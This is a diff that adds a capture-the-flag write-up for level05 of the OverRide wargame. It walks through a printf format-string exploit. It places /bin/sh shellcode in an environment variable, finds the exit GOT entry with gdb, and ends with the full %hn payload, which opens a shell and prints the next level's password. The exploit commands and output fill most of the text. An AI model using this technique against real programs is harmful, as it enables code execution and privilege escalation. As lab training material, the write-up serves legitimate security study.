@@ -1,0 +1,66 @@
+
+
+in this level there is just a main with a tolower() function that lower any buffer we put with fgets
+even tho it prints it directly -(which is the overflow)- with printf we can't do much when the data we put is lowered
+
+so we figured from this website help "https://systemoverlord.com/2014/02/12/printf-format-string-exploitation/"
+
+that we need to inject a shellcode in the env and get its adress and use it..
+
+let's inject a shellcode first on the env:
+------------------------------------
+export SHELLCOD=$(python -c "print '\x90' * 130 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
+------------------------------------
+
+then we need to get the address of our shellcode using a simple program: // check the resources
+------------------------------------
+level05@OverRide:/tmp$ gcc -m32 a.c
+level05@OverRide:/tmp$ ./a.out SHELLCODE
+0xffffd7ad
+level05@OverRide:/tmp$
+------------------------------------
+
+we got our adress and it's too huge to pass it directly to the got adreess 
+PS : we will override the got address with our shellcode address
+
+let's get the got adddress:
+------------------------------------
+(gdb) disassemble main
+.
+.
+   0x08048507 <+195>:	call   0x8048340 <printf@plt>
+   0x0804850c <+200>:	movl   $0x0,(%esp)
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>
+End of assembler dump.
+(gdb) disassemble 0x8048370
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:	jmp    *0x80497e0
+   0x08048376 <+6>:	push   $0x18
+   0x0804837b <+11>:	jmp    0x8048330
+End of assembler dump.
+(gdb)
+------------------------------------
+so the got address is 0x80497e0
+
+and we will do it by using each 4 bytes to store half of the address 
+for example we got on our address  : 0xffffd7ad.. so we will store ffff on the half which is 0x80497e0
+	and store d7ad in (0x80497e0 + 2) and that to overide it to out env's address
+
+we need the exact argument where the variable we pass to printf:
+-----------------------------
+level05@OverRide:~$ ./level05
+%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+64 f7fcfac0 f7ec3af9 ffffd57f ffffd57e 0 ffffffff ffffd604 f7fdb000 25207825 78252078 20782520 25207825 78252078 20782520
+level05@OverRide:~$
+-----------------------------
+
+so we notice that the arguments are the 10th place and the 11th place
+
+----------------------------
+level05@OverRide:~$ (python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55205x' + '%10\$hn' + '%10322x' + '%11\$hn'";cat) | ./level05
+.
+.
+.
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+-----------------------------
